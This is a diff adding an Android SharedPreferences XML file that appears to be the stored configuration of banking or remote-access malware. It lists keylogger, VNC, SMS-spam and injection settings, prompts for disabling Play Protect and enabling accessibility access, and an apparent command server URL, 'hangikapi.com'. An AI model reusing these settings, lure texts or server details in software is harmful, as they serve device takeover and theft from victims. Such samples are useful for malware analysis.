@@ -1,0 +1,73 @@
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="foregroundwhile"></string>
+    <string name="permissions_granted">NO</string>
+    <string name="timeStartGrabber"></string>
+    <string name="sound">start</string>
+    <string name="stringDisableProtect2">TURN OFF</string>
+    <string name="StringActivate">activate</string>
+    <string name="buttonPlayProtect"></string>
+    <string name="recordsoundseconds">0</string>
+    <string name="vnc">start</string>
+    <string name="lock_amount"></string>
+    <string name="VNC_Start_NEW">http://hangikapi.com</string>
+    <string name="gps">false</string>
+    <string name="checkStartGrabber">0</string>
+    <string name="isAccessbility">true</string>
+    <string name="swspacket">com.android.mms</string>
+    <string name="startRequest">Access=0Perm=0</string>
+    <string name="urls">Nzg4M2UyODljODM1MThkZThkZjE1YzBjNGFmMTM4ZWNiY2U0MzY3Yw==
+    </string>
+    <string name="str_push_fish"></string>
+    <string name="interval">10000</string>
+    <string name="perehvat_sws">false</string>
+    <string name="htmllocker"></string>
+    <string name="straccessibility">start now</string>
+    <string name="time_start_permission">2725</string>
+    <string name="network">false</string>
+    <string name="StringPermis">Allow</string>
+    <string name="uninstall1">uninstall</string>
+    <string name="getNumber">false</string>
+    <string name="uninstall2">to remove</string>
+    <string name="name">false</string>
+    <string name="play_protect"></string>
+    <string name="StringAccessibility">Enable access for</string>
+    <string name="Starter">http://hangikapi.com</string>
+    <string name="stringDisableProtect">Settings</string>
+    <string name="urlInj"></string>
+    <string name="isWorking">true</string>
+    <string name="keylogger"></string>
+    <string name="url">http://hangikapi.com</string>
+    <string name="textPlayProtect"></string>
+    <string name="forpm">false</string>
+    <string name="del_sws">false</string>
+    <string name="straccessibility2">to start</string>
+    <string name="websocket"></string>
+    <string name="status"></string>
+    <string name="dateCJ"></string>
+    <string name="textSPAM"></string>
+    <string name="SettingsAll"></string>
+    <string name="cryptfile">false</string>
+    <string name="startRecordSound">stop</string>
+    <string name="RequestGPS"></string>
+    <string name="spamSMS"></string>
+    <string name="step">0</string>
+    <string name="madeSettings">1 2 3 4 5 6 7 8 9 10 11 12 13 </string>
+    <string name="time_work">2050</string>
+    <string name="B_DID">47e77e41c673b8c2</string>
+    <string name="RequestINJ"></string>
+    <string name="lock_btc"></string>
+    <string name="isReconnected">false</string>
+    <string name="StringYes">Yes</string>
+    <string name="DexSocksModule">yes</string>
+    <string name="findfiles"></string>
+    <string name="key"></string>
+    <string name="indexSMSSPAM"></string>
+    <string name="lookscreen"></string>
+    <string name="id_windows_bot"></string>
+    <string name="stringDisableProtect3">Scan apps with Play Protect</string>
+    <string name="vkladmin">include</string>
+    <string name="isFirstInstall">false</string>
+    <string name="save_inj"></string>
+    <string name="iconCJ">0:0</string>
+</map>
